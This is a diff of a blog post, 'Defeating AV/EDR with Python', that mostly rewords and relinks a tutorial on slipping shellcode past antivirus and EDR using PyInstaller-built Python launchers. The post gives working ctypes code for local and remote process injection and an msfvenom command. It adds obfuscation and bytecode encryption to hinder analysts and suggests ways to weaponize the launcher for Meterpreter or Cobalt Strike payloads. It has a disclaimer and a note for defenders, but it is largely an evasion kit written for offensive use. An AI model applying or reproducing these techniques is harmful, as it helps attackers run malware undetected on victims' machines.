@@ -1,11 +1,11 @@
 ---
 layout: page
-title: "Defeating Antivirus with Python"
-categories: python evasion shellcode
+title: "Defeating AV/EDR with Python"
+categories: security
 published: true
 ---
 
-Antivirus (AV) has advanced a lot, even in the short years that I've spent attempting to evade it. Tricks that I've used 2 years ago to get a shell on a endpoint just don't work anymore. Because of this, I've had to resort to trying different methods of shellcode execution on hosts. One thing I've noticed is that some common AV tools fail to detect shellcode injection from Pyinstalled binaries. I don't have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.
+Antivirus (AV) and Endpoint Detection and Response (EDR) tools have gotten a lot more advanced in recent years. Tricks that I've used 2 years ago to get a shell on a typical endpoint just don't work anymore. Because of this, I've had to resort to trying different methods of shellcode execution on hosts. One thing that I've noticed is that some common AV/EDR tools fail to detect shellcode injection from Pyinstalled binaries. I don't have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.
 
 **Theory 1:** Machine Learning-based AV/EDR don't have enough Pyinstalled binaries, especially malicious ones, to properly categorize these as malicious.
 
@@ -25,12 +25,12 @@ It's interesting that such an old technique can fool some of the biggest names i
 
 ## Purpose
 
-In this post, I'm going to review a few Python 3 shellcode injection techniques that are pretty well known, and tie in some other neat tricks to get around AV to execute shellcode. I'm hoping to give Red Teamers/Pentesters a new set of ideas for shellcode execution/AV evasion, and to give Defenders something to test in their own environment.
+In this post, I'm going to review a few Python 3 shellcode injection techniques that are pretty well known, and tie in some other neat tricks to get around AV/EDR tools to execute shellcode. I'm hoping to give Red Teamers/Pentesters a new set of ideas for shellcode execution/AV evasion, and to give Defenders something to test in their own environment.
 
 Before getting started, I should mention a few things:
 - These techniques are not novel. I'll include the references I used, but there are many examples of Python shellcode execution.
 - The generated binaries are BIG. There are practical uses, but I wouldn't consider dropping a 10MB exe to a host 'stealthy' in most cases. But hey, a shell is a shell!
-- This technique WILL bypass some of the big name AV vendors. I recommend that Defenders run a variant of this in their environment to test their AV.
+- This technique WILL bypass some of the big name AV/EDR. I recommend that Defenders run a variant of this in their environment to test their AV/EDR.
 - **As with all of my code/documentation/articles, this is not to be used maliciously. Use this information for good, and follow all laws of your Nation/State/County/City/Home.**
 
 ## Getting Started
@@ -39,7 +39,7 @@ It will be useful to cover some pre-requisite information before getting into th
 
 ### Development Environment
 
-I needed a few common tools to develop and test these techniques, and so will you. I'll include what I used, why I needed it, and some resources below.
+You're going to need a few things to get started. I'll include what you need, why you need it, and some resources below.
 - Windows 10 VM: Used for testing the launcher script, running Pyinstaller.
 - Kali Linux VM: Development host for the encryption/encoding script, hosting the shellcode, generating the shellcode.
 - Python 3.6+: Used for running Python scripts.
@@ -48,14 +48,14 @@ I needed a few common tools to develop and test these techniques, and so will yo
 - A text editor: Pick whatever you prefer. I'll be using vim and the Python Idle IDE.
 
 Resources:
-- Legit, temporary Windows 10 VMs: <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>
-- Kali Linux: <https://www.kali.org/>
-- Python 3: <https://www.python.org/downloads/>
-- Pyinstaller: <https://www.pyinstaller.org/>
+- Legit, temporary Windows 10 VMs: [Windows 10](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
+- Kali Linux: https://www.kali.org/
+- Python 3: https://www.python.org/downloads/
+- Pyinstaller: https://www.pyinstaller.org/
 
 ### Generating Shellcode
 
-For test purposes, I used generic Windows shellcode for x64 architecture generated using msfvenom. I've also tested some other common shellcodes with these techniques.
+For test purposes, generate generic Windows shellcode for x64 architecture using msfvenom.
 
 ```
 msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o calc_x64.bin
@@ -133,13 +133,13 @@ You may also think that converting the string (unicode) to bytes via the encode(
 shellcode.encode('latin-1')
 ```
 
-This was a neat little trick to get this running, found [here](https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/).
+This was a neat little trick to get this running, found here: [Latin1](https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/)
 
 These issues won't apply for how I will run shellcode in this article, but it's something very important to keep in mind when running shellcode that has been stored in the script itself. Always stay aware of your bytes/string conversions.
 
 ## Encryption, Encoding
 
-Back to the fun stuff. The first order of business when getting around AV is getting your shellcode into memory without getting caught. There are two main ways that I can see to do this:
+Back to the fun stuff. The first order of business when getting around AV/EDR is getting your shellcode into memory without getting caught. There are two main ways that I can see to do this:
 1. Store the shellcode (in some form) within the Python script/bin.
 2. Load the shellcode (in some form) into memory from elsewhere.
 
@@ -268,13 +268,13 @@ Since I've got the shellcode in memory, in byte format, it's time to execute it.
 
 Shoutout to the always crafty gentlemen/women of Black Hills Information Security. I was able to get this working after long await thanks to the talk and source code they put out.
 
-Code Referenced: <https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py>
+Code Referenced: [Reference Code](https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py)
 
-Author: [Mike Feltch](https://github.com/ustayready)
+Author: Mike Feltch (https://github.com/ustayready)
 
 ### The ctypes Library
 
-The ctypes library offers a few things that will be useful for executing the shellcode. First, it allows us to load the kernel32 DLL, giving me access to the functions that I need within that DLL. It also allows me to load various datatypes useful when calling Windows API functions.
+The ctypes library offers a few things that will be useful for executing the shellcode. First, it allows us to load the kernel32 DLL, giving us access to the functions that we need within that DLL. It also allows us to load various datatypes useful when calling Windows API functions.
 
 Import the libraries.
 
@@ -285,7 +285,7 @@ import ctypes.wintypes
 
 ### Defining the kernel32 Functions
 
-Without defining argtypes for the various kernel functions that I'm using, there will eventually be some odd type-related errors (see below).
+Without defining argtypes for the various kernel functions that we're using, there will eventually be some odd type-related errors (see below).
 
 ![Error](/assets/images/python_injection_2.PNG)
 
@@ -316,36 +316,36 @@ VirtualProtect.restype = ctypes.wintypes.BOOL
 I recommend research into these functions, and those used in the section below. I'll provide a brief explanation, but the specifics of the types used here are not simple, and somewhat above my understanding.
 
 References:
-- <https://docs.python.org/3/library/ctypes.html>
-- <https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc>
-- <https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread>
-- <https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect>
+- https://docs.python.org/3/library/ctypes.html
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
+- https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
 
 ### Calling the kernel32 Functions
 
 Now it's time to actually execute the shellcode. This involves 5 steps.
 
-Allocation of memory using the VirtualAlloc function, ensuring the memory has the read/write/execute protection option. Read/write will not work. ([Reference](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)).
+Allocation of memory using the VirtualAlloc function, ensuring the memory has the read/write/execute protection option. Read/write will not work. (https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).
 ```
 memptr = VirtualAlloc(0, len(shellcode), MEM_COMMIT, PAGE_READWRITE_EXECUTE)
 ```
 
-Copy memory contents from the shellcode memory location to the memory location allocated above using RtlMoveMemory ([Reference](https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)).
+Copy memory contents from the shellcode memory location to the memory location allocated above using RtlMoveMemory (https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory).
 ```
 ctypes.windll.kernel32.RtlMoveMemory(memptr, shellcode, len(shellcode))
 ```
 
-Change the allocated memory region's protection option to read/execute. This is not necessary, but will make execution of the shellcode less 'suspicious'. Check out the list of memory protection constants [here](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants).
+Change the allocated memory region's protection option to read/execute. This is not necessary, but will make execution of the shellcode less 'suspicious'. Check out the list of memory protection constants here: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants.
 ```
 ctypes.windll.kernel32.VirtualProtect(memptr, len(shellcode), PAGE_READ_EXECUTE, 0)
 ```
 
-Create a thread that executes the shellcode within the context of the current process ([Reference](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)).
+Create a thread that executes the shellcode within the context of the current process (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).
 ```
 thread = ctypes.windll.kernel32.CreateThread(0, 0, memptr, 0, 0, 0)
 ```
 
-Cause the current thread to wait for completed execution of the previously created thread ([Reference](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)).
+Cause the current thread to wait for completed execution of the previously created thread (https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject).
 ```
 ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
 ```
@@ -364,7 +364,7 @@ The next execution method allows for the execution of the shellcode in a remote 
 
 ### Finding a PID
 
-There are a few ways to find running processes that the current user has read/write/execute access to. The easiest ways are to use either the Python [psutil](https://psutil.readthedocs.io/en/release-3.2.2/) or [wmi](https://pypi.org/project/WMI/) library. I'll demonstrate using psutil, but either are fine.
+There are a few ways to find running processes that the current user has read/write/execute access to. The easiest ways are to use either the Python psutil (https://psutil.readthedocs.io/en/release-3.2.2/) or wmi (https://pypi.org/project/WMI/) library. I'll demonstrate using psutil, but either are fine.
 
 Import methods to list running processes and retrieve username running the Launcher.
 
@@ -402,7 +402,7 @@ for proc in process_iter():
                 break
 ```
 
-At this point, I have a PID for a process that I can (most likely) inject shellcode into.
+At this point, I have a PID for a process that we can (most likely) inject shellcode into.
 
 ### Defining the kernel32 Functions
 
@@ -438,20 +438,20 @@ WriteProcessMemory.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, c
 WriteProcessMemory.restype = ctypes.wintypes.BOOL
 ```
 
-You should notice that these functions look similar to those defined for the previous method. The functions ending in 'ex' serve similar purposes as their counterparts used previously, but act on a remote process. There are also a few functions included here to handle (heh...) remote processes. Once again, I'll provide a brief explanation of these functions, but check out the references below.
+You should notice that these functions look similar to those defined for the previous method. The functions ending in 'ex' serve similar perposes as their counterparts used previously, but act on a remote process. There are also a few functions included here to handle (heh...) remote processes. Once again, I'll provide a brief explanation of these functions, but check out the references below.
 
 References:
-- <https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory>
-- <https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread>
-- <https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess>
-- <https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex>
-- <https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex>
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+- https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
+- https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
 
 ### Calling the kernel32 Functions
 
 With the functions defined, it's time to execute the shellcode.
 
-First, I need to obtain a handle for the target process with the PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights ([Reference](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)). A handle is basically an identifier for the process in integer format used across Windows API functions. Note that the PID found earlier is passed here.
+First, I need to obtain a handle for the target process with the PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights (see: https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights). A handle is basically an identifier for the process in integer format used across Windows API functions. Note that the PID found earlier is passed here.
 ```
 handle = OpenProcess(0x00028, False, my_pid)
 ```
@@ -466,7 +466,7 @@ Write the shellcode to the allocated memory region.
 result = WriteProcessMemory(handle, memptr, sc, len(sc), 0)
 ```
 
-Change protection of the allocated memory region to Read/Execute ([Reference](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)). There is no need for the Write attribute since we've already written the shellcode to this region.
+Change protection of the allocated memory region to Read/Execute (see: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants). There is no need for the Write attribute since we've already written the shellcode to this region.
 ```
 result = VirtualProtectEx(handle, memptr, len(sc), 0x20, 0)
 ```
@@ -513,13 +513,13 @@ cd .\dist\
 .\Launcher.exe
 ```
 
-You should have gotten a calc.exe if you're following along.
+You should have gotten a calc.exe.
 
-**Note:** Pyinstalled binaries are OS specific. You should compile the binary on the same OS version/architecture that you are targeting.
+Note: Pyinstalled binaries are OS specific. You should compile the binary on the same OS version/architecture that you are targeting.
 
 ## Obfuscating the Python Code
 
-One of the downsides of running Pyinstalled binaries on a target is that the source Python scripts aren't truly 'compiled'. Pyinstaller includes compiled .pyc files within the generated bundle, which can be extracted and analyzed to reveal the original Python code. This is a problem for Offensive teams, because it can allow even unskilled analysts to see the Launcher logic. For Defenders looking to test out analyzing Pyinstalled binaries, [check this out](https://github.com/countercept/python-exe-unpacker).
+One of the downsides of running Pyinstalled binaries on a target is that the source Python scripts aren't truly 'compiled'. Pyinstaller includes compiled .pyc files within the generated bundle, which can be extracted and analyzed to reveal the original Python code. This is a problem for Offensive teams, because it can allow even unskilled analysts to see the Launcher logic. For Defenders looking to test out analyzing Pyinstalled binaries, check this out: https://github.com/countercept/python-exe-unpacker.
 
 For Offensive folks looking to further defend against Defenders/AV/EDR, keep reading...
 
@@ -607,7 +607,7 @@ if __name__ == '__main__':
 
 ### PyInstaller Encryption
 
-Another technique to throw analysts and AV off your trail is using PyInstaller's --key option. This will encrypt the Python bytecode using a key passed to this command line parameter.
+Another technique to throw analysts and AV/EDR off your trail is using PyInstaller's --key option. This will encrypt the Python bytecode using a key passed to this command line parameter.
 
 ```
 pyinstaller.exe --key=mypassword123456 --onefile .\Launcher.py
@@ -617,7 +617,7 @@ One thing to note if you get errors with this, is that I was using pycryptodome 
 
 ## Weaponization
 
-These techniques can be used to bypass various AV tools when running shellcode. Thus far, I've tested this with generic Windows command execution shellcodes, Meterpreter shells, and CobaltStrike beacon shellcode with success. While these techniques work, I've only touched the surface, and I certainly haven't provided the best code examples. I can see a lot of cool ways to 'weaponize' this for use in a Campaign, notably:
+These techniques can be used to bypass various AV/EDR tools when running shellcode. Thus far, I've tested this with generic Windows command execution shellcodes, Meterpreter shells, and CobaltStrike beacon shellcode with success. While these techniques work, I've only touched the surface, and I certainly haven't provided the best code examples. I can see a lot of cool ways to 'weaponize' this for use in a Campaign, notably:
 - Creating a script to encrypt/encode/format the shellcode in various ways
 - Creating a script to populate a launcher template with this information
 - Options to embed the shellcode in the launcher or download via URL
@@ -630,6 +630,7 @@ These techniques can be used to bypass various AV tools when running shellcode. 
 
 ## Conclusion
 
-For the Offensive folks, I hope I've given you some good ideas on getting shellcode around around AV tools using Python. For such an old trick, it really stands up well. For the Defensive folks, I recommend taking a deeper look at these types of binaries. I can't foresee many situations where they would be very useful, but there are a few. If new ways of executing Python scripts on Windows (Ironpython?), I can can imagine the use of python for shellcode execution will become more popular.
+For the Offensive folks, I hope I've given you some good ideas on getting shellcode around around AV/EDR tools using Python. For such an old trick, it really stands up well. For the Defensive folks, I recommend taking a deeper look at these types of binaries. I can't foresee many situations where they would be very useful, but there are a few. If new ways of executing Python scripts on Windows (Ironpython?), I can can imagine the use of python for shellcode execution will become more popular.
 
 Thanks for reading.
+
